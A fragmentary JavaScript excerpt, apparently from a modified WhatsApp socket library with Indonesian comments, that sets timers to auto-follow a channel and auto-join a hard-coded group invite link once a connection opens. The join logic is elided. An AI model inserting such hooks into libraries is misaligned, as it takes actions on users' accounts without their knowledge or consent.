...
// Daftar link group WhatsApp untuk auto join
const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/CKXKGWjDfua2HfQHhMix2U"
    // Tambahkan link group lain di sini jika diperlukan
];
...
const makeNewsletterSocket = (config) => {
    ...
    // Auto-follow ke channel WhatsApp setelah koneksi terbuka
    setTimeout(async () => {
        try {
    ...
    // Auto join ke group WhatsApp setelah beberapa detik
    setTimeout(async () => {
        try {
